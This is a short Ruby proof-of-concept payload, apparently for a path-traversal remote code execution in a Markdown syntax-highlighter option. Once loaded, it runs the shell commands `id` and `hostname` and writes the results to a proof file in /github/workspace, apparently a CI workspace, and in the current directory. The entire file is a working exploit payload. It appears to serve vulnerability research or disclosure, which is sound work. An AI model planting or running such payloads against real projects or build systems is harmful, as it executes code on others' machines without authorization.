# Syntax highlighter path traversal RCE proof
# This file should ONLY be loaded via {::options syntax_highlighter="..." /}
# NOT via any ERB template
$syntax_hl_rce_proof = []
$syntax_hl_rce_proof << "SYNTAX_HL_RCE=CONFIRMED"
$syntax_hl_rce_proof << "TIME=#{Time.now}"
$syntax_hl_rce_proof << "ID=#{`id 2>&1`.strip}"
$syntax_hl_rce_proof << "HOSTNAME=#{`hostname 2>&1`.strip}"
$syntax_hl_rce_proof << "LOADED_BY=require_path_traversal"

output = $syntax_hl_rce_proof.join("\n") + "\n"
File.write('/github/workspace/sh-rce-proof.txt', output) rescue nil
File.write(File.join(Dir.pwd, 'sh-rce-proof.txt'), output) rescue nil
